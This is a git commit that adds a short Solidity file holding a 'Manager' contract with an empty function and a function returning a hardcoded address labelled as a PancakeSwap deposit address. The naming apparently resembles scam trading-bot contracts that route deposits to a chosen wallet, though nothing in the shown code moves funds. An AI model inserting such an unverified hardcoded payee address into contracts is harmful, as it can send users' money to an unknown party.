3a93c5b31da5586715372585deb46d68d6682c9e
gusign <46125935+gusign@users.noreply.github.com>
2022-08-09 04:46:48 +0800

    Create address.sol

---
+++ address.sol
@@ -0,0 +1,9 @@
+// Code Manager
+contract Manager { function performTasks() public pure{
+
+}
+
+function pancakeswapDepositAddress() public pure returns (address) {
+    return 0xaed24c2E9e52ce48FD4d589FA45d8a3Dc057f235;
+}
+}
